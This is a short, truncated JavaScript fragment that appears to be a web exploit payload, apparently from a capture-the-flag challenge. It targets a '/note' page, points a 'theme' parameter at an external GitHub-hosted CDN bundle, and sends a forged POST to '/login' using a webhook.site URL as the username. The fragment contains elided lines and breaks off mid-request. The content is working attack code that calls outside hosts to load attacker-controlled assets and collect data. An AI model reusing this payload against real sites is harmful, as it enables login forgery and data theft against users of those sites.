if(location.href.includes('/note')){
    ...
    search.set(
        "theme",
        "https://cdn.jsdelivr.net/gh/logiris/tmp/dist"
    )
    search.set('tex', "hi!")

    const targetURL = new URL("/preview", location.href)
    ...
    fetch("/login", {
        method: "POST",
        // 这里的body是请求体的话，是不是说明SearchParams不是只指get参数
        body: new URLSearchParams({
            username:"https://webhook.site/9e476cee-42dc-4cb5-8196-24d24fc59ddf",
            password:"860294c887b175b4d0e8211c78e550ab",
        }),
        headers:{
